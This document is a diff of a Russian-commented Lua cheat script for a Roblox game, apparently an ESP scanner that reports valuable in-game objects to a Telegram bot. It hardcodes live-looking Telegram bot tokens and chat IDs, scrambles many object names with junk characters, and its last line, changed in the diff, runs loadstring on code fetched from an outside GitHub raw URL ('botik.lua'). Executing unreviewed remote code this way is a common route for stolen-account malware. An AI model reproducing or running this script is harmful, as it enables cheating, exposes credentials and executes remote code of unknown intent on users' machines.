@@ -31,36 +31,31 @@ local SCANNER_SETTINGS = {
 
 -- Настройки Telegram ботов
 local TG_MAIN = {
-    Token = "8216378798:AAGEMg0TE-Cc_cLsF2QWkm8vbcYWMNhfvJE",
-    ChatId = "5263524993",
+    Token = "8158106101:AAGTaP3CEjnWh1rjNjj7UlqfJisani8Gwz8",
+    ChatId = "1090955422",
     Enabled = true,
     ImportantObjects = {
-        ["Secret Lucky Block"] = true,
-        ["Pot H77otspot"] = true,
+        ["Pot Hotspdddot"] = true,
         ["La Grande Combinasion"] = true,
         ["Garama and Madundung"] = true,
         ["Nuclearo Dinossauro"] = true,
-        ["Chicleteira Bicicleteira"] = true,
         ["Dragon Cannelloni"] = true,
         ["Los Combinasionas"] = true,
         ["Los Hotspotsitos"] = true,
         ["Esok Sekolah"] = true,
         ["La Supreme Combinasion"] = true,
-        ["No77ot"] = true,
+        ["Nooo My Hodsadadatspot"] = true,
         ["Ketupat Kepat"] = true,
-        ["Noo567tspot"] = true,
+        ["Nofddsfoo My Hotspot"] = true,
         ["Spaghetti Tualetti"] = true,
         ["Strawberry Elephant"] = true,
         ["Ketchuru and Musturu"] = true,
-        ["hh"] = true,
         ["La Kark7658erkar Combinasion"] = true,
         ["Tralaledon"] = true,
         ["Los Bros"] = true,
-        ["gg"] = true,
-        ["Las sis"] = true,
-        ["Celularcini Viciosini"] = true,
         ["La Extinct Grande"] = true,
         ["Los Chicleteiras"] = true,
+        ["Las Sis"] = true,
         ["Tacorita Bicicleta"] = true,
         ["Tictac Sahur"] = true
     }
@@ -89,13 +84,13 @@ end
 
 -- Доходы объектов (все значения в /s)
 local OBJECT_INCOME = {
-    ["La Vacca Saturno Saturnita"] = "300K/s",
+    ["La Vacca Saturno Saturnita"] = "250K/s",
     ["Chimpanzini Spiderini"] = "325K/s",
     ["Los Tralaleritos"] = "500K/s",
     ["Las Tralaleritas"] = "625K/s",
     ["Graipuss Medussi"] = "1M/s",
     ["Torrtuginni Dragonfrutini"] = "350K/s",
-    ["Pot Hotsp666ot"] = "2.5M/s",
+    ["Pot Hotspot"] = "2.5M/s",
     ["La Grande Combinasion"] = "10M/s",
     ["Garama and Madundung"] = "50M/s",
     ["Secret Lucky Block"] = "???/s",
@@ -110,18 +105,18 @@ local OBJECT_INCOME = {
     ["Karkerkar Kurkur"] = "275K/s",
     ["Job Job Job Sahur"] = "700K/s",
     ["La Supreme Combinasion"] = "40M/s",
-    ["Nooo My7777t"] = "1.5M/s",
+    ["Nooo My Hotspot"] = "1.5M/s",
     ["Spaghetti Tualetti"] = "60M/s",
     ["Strawberry Elephant"] = "250M/s",
+    ["Ketupat Kepat"] = "35M/s",
     ["Ketchuru and Musturu"] = "42.5M/s",
-    ["Los Nooo My Hotspotsitos"] = "5M/s",
+    ["Los Nooo My Hotssffsdsdpotsitos"] = "5M/s",
     ["La Kark767erkar Combinasion"] = "50M/s",
-    ["Tralaledon"] = "50M/s",
-    ["Los Bros"] = "27.5M/s",
-    ["Las Sis"] = "17.5M/s",
-    ["Celularcini Viciosini"] = "22.5M/s",
+    ["Tralaledon"] = "27.5M/s",
+    ["Los Bros"] = "24M/s",
     ["La Extinct Grande"] = "23.5M/s",
     ["Los Chicleteiras"] = "7M/s",
+    ["Las Sis"] = "18M/s",
     ["Tacorita Bicicleta"] = "16.5M/s",
     ["Tictac Sahur"] = "37M/s"
 }
@@ -152,7 +147,17 @@ local TRAIT_MULTIPLIERS = {
     ["Bubblegum"] = 4,
     ["Cometstruck"] = 3.5,
     ["Galactic"] = 4,
-    ["Explosive"] = 4
+    ["Explosive"] = 4,
+    ["Paint"] = 6,
+    ["Brazil"] = 6,
+    ["Matteo Hat"] = 3.5,
+    ["Rain"] = 1.5,
+    ["UFO"] = 3,
+    ["Skeleton"] = 4,
+    ["Spider"] = 4.5,
+    ["Sombrero"] = 5
+    
+    
 }
 
 -- Эмодзи для объектов
@@ -163,10 +168,10 @@ local OBJECT_EMOJIS = {
     ["Las Tralaleritas"] = "🌸",
     ["Graipuss Medussi"] = "🦑",
     ["Torrtuginni Dragonfrutini"] = "🐉",
-    ["Pot Ho666tspot"] = "📱",
+    ["Pot Hotspot"] = "📱",
     ["La Grande Combinasion"] = "❗️",
     ["Garama and Madundung"] = "🥫",
-    ["hff"] = "⬛️",
+    ["Secret Lucky Block"] = "⬛️",
     ["Dragon Cannelloni"] = "🐲",
     ["Nuclearo Dinossauro"] = "🦕",
     ["Las Vaquitas Saturnitas"] = "👦",
@@ -175,24 +180,22 @@ local OBJECT_EMOJIS = {
     ["Agarrini la Palini"] = "🥄",
     ["Los Hotspotsitos"] = "☎️",
     ["Esok Sekolah"] = "🏠",
-    ["N777ot"] = "👽",
-    ["Job Job Job Sahur"] = "⬜️",
+    ["Nooo My Hotspot"] = "👽",
     ["La Supreme Combinasion"] = "🔫",
     ["Admin Lucky Block"] = "🆘",
-    ["Ketupat Kepat"] = "⚰️",
+    ["Ketupat Kepat"] = "🍏",
     ["Strawberry Elephant"] = "🐘",
     ["Spaghetti Tualetti"] = "🚽",
     ["Ketchuru and Musturu"] = "🍾",
-    ["hh"] = "🥔",
+    ["Los Nooo My Hotspdffsfsfotsitos"] = "🥔",
     ["La Kark666erkar Combinasion"] = "🥊",
     ["Tralaledon"] = "🦈",
     ["Los Bros"] = "✊",
-    ["Las Sis"] = "👩",
-    ["Celularcini Viciosini"] = "🦾",
-    ["La Extinct Grande"] = "🦴",
-    ["Los Chicleteiras"] = "💰",
+    ["La Extinct Grande"] = "🩻", 
+    ["Los Chicleteiras"] = "🚳",
+    ["Las Sis"] = "👧",
     ["Tacorita Bicicleta"] = "🌮",
-    ["Tictac Sahur"] = "🕰"
+    ["Tictac Sahur"] = "🕰️"
 }
 
 -- Эмодзи для мутаций
@@ -214,10 +217,10 @@ local OBJECT_NAMES = {
     "Las Tralaleritas",
     "Graipuss Medussi",
     "Torrtuginni Dragonfrutini",
-    "Pot Ho566tspot",
+    "Pot Hotspot",
     "La Grande Combinasion",
     "Garama and Madundung",
-    "Sec555ret Lucky Block",
+    "Secret Lucksfsfsfy Block",
     "Dragon Cannelloni",
     "Nuclearo Dinossauro",
     "Las Vaquitas Saturnitas",
@@ -226,22 +229,20 @@ local OBJECT_NAMES = {
     "Agarrini la Palini",
     "Los Hotspotsitos",
     "Esok Sekolah",
-    "N7777ot",
-    "Job Job Job Sahur",
+    "Nooo My Hotspot",
     "La Supreme Combinasion",
     "Admin Lucky Block",
     "Ketupat Kepat",
     "Strawberry Elephant",
     "Spaghetti Tualetti",
     "Ketchuru and Musturu",
-    "Los Nooo My Ho7tos",
+    "Los Nooo Mysffsfsf Hotspotsitos",
     "La Kark56656erkar Combinasion",
     "Los Bros",
     "Tralaledon",
-    "Las Sis",
-    "Celularcini Viciosini",
     "La Extinct Grande",
     "Los Chicleteiras",
+    "Las Sis",
     "Tacorita Bicicleta",
     "Tictac Sahur"
 }
@@ -766,4 +767,4 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua'))()
